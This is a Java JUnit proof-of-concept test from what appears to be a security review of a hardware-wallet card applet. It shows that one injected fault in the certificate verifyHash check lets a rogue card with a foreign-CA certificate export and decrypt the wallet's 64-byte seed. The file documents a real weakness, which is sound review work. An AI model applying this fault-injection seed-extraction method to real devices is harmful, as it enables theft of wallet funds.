// SPDX-FileCopyrightText: 2026 QuantX
// SPDX-License-Identifier: AGPL-3.0-or-later
package org.qntx.card.review;

import static org.junit.jupiter.api.Assertions.*;
import static org.qntx.card.review.ReviewHost.*;

import java.math.BigInteger;
import org.junit.jupiter.api.Test;
import org.qntx.card.review.ReviewSession.Inner;
import org.qntx.card.sim.Fault;

/**
 * PoC (review, finding R-03): EXPORT P1=0x00 verifies the target certificate once ({@code
 * Identity.verifyCert}, Transfer.java:169) and then "evaluates it twice" only by re-testing the
 * stored local through {@code held} (Transfer.java:206; {@code held} is the identity function,
 * Transfer.java:481), so the second evaluation of §16.2 item 4 cannot be independent — one fault
 * inside the single verification defeats it. Simulated by arming the woven {@code
 * Secp256k1.verifyHash} call site to return CHECK_OK on the certificate check (the first verifyHash
 * call of the command, confirmed by a dry run).
 *
 * <p>The attacker is a rogue card R whose ID was written into {@code members} at CREATE — a
 * host-generated identity key pair, a certificate signed by a foreign CA, a genuine offer signature
 * under its own identity key and its own link key. With the cert check faulted the card exports the
 * wallet under Z = e·LK_R, which the attacker decrypts with its link private key.
 *
 * <p>The test asserts the faulty behaviour on the current code: with the fault armed both EXPORT
 * commands answer 9000 and the host recovers the exact 64-byte seed; without it EXPORT P1=0x00 is
 * refused 6A80.
 */
final class SpofExportCertTest {

    private static final byte[] S0 =
            unhex(
                    "00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF"
                            + "00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF");
    private static final byte[] H0 = sha256("review access hash H0".getBytes());
    private static final byte[] HT = sha256("review access hash HT".getBytes());
    private static final short CHECK_OK = (short) 0x6666;

    private static final class Rig {
        ReviewCard c;
        ReviewSession s;
        BigInteger rogueId;
        byte[] rogueA;
        byte[] rogueCert;
        BigInteger rogueLink;
        byte[] rogueLk;
        byte[] rogueSigT;
    }

    /**
     * Card X in L2: members = (ID(A_X), ID(A_R)). R is host-made: own identity key, a certificate
     * over A_R signed by a foreign CA (not the batch CA), own link key, and a genuine sig_T over
     * "…/offer" ‖ LK_R under its identity key.
     */
    private static Rig rig() {
        Rig r = new Rig();
        r.rogueId = randomScalar();
        r.rogueA = compr(g().multiply(r.rogueId));
        r.rogueCert = cert(i2b(randomScalar(), 32), r.rogueA); // foreign CA
        r.rogueLink = randomScalar();
        r.rogueLk = uncomp(g().multiply(r.rogueLink));
        r.rogueSigT = ecdsaSign(r.rogueId, concat(LABEL_OFFER, r.rogueLk));
        r.c = ReviewCard.uninitialised();
        r.c.blank();
        r.s = r.c.create(S0, H0, cardId(r.rogueA)); // session left verified by CREATE (§9.4)
        return r;
    }

    private static byte[] export0Command(Rig r) {
        return concat(r.rogueCert, r.rogueLk, r.rogueSigT);
    }

    @Test
    void controlWithoutFault() {
        Rig r = rig();
        try {
            Inner res = r.s.cmd((byte) 0x41, (byte) 0x00, (byte) 0, export0Command(r));
            assertEquals(0x6A80, res.sw, "control: foreign-CA cert must be refused 6A80");
        } finally {
            Fault.reset();
        }
    }

    @Test
    void seedExfiltrationByOneVerifyHashFault() {
        Rig r = rig();
        try {
            // dry run: the refused request performs exactly one verifyHash call — the cert
            // check — before answering 6A80, so call 1 is the certificate verification
            Fault.countCalls();
            Inner refused = r.s.cmd((byte) 0x41, (byte) 0x00, (byte) 0, export0Command(r));
            assertEquals(0x6A80, refused.sw, "dry run: foreign-CA cert refused");
            int calls = Fault.calls("Secp256k1.verifyHash");
            assertEquals(1, calls, "the cert check must be verifyHash call 1, saw " + calls);
            Fault.reset();

            Fault.arm("Secp256k1.verifyHash", 1, CHECK_OK);
            Inner e0 = r.s.cmd((byte) 0x41, (byte) 0x00, (byte) 0, export0Command(r));
            Fault.reset();
            assertEquals(
                    0x9000,
                    e0.sw,
                    "one verifyHash fault must pass the foreign cert (observed "
                            + String.format("%04X", e0.sw)
                            + ")");
            assertEquals(129, e0.data.length);
            byte[] eph = slice(e0.data, 0, 65);
            byte[] sigS = slice(e0.data, 65, 64);
            byte[] exportM = concat(LABEL_EXPORT, r.s.cardA, r.rogueA, r.rogueLk, eph);
            assertTrue(
                    ecdsaVerify(r.s.cardA, exportM, sigS),
                    "sig_S over the export message must verify under A");

            Inner e1 = r.s.cmd((byte) 0x41, (byte) 0x01, (byte) 0, HT);
            assertEquals(0x9000, e1.sw, "EXPORT P1=0x01");
            assertEquals(160, e1.data.length, "ct ‖ tag for c = 2");

            // the rogue card holds the link private key: K_te ‖ K_tm and the payload are its
            byte[] z = ecdhX(r.rogueLink, eph);
            byte[] payload = FakeMember.unsealRecord(z, exportM, e1.data);
            assertNotNull(payload, "attacker decrypts the export record");
            assertEquals(130, payload.length);
            assertEquals(0x02, payload[0] & 0xFF, "origin = imported (CREATE P1=0x01)");
            assertArrayEquals(S0, slice(payload, 1, 64), "the 64-byte seed left the card");
            assertArrayEquals(HT, slice(payload, 65, 32));
            assertEquals(0x02, payload[97] & 0xFF, "c = 2");
            assertArrayEquals(cardId(r.s.cardA), slice(payload, 98, 16));
            assertArrayEquals(cardId(r.rogueA), slice(payload, 114, 16));
        } finally {
            Fault.reset();
        }
    }
}
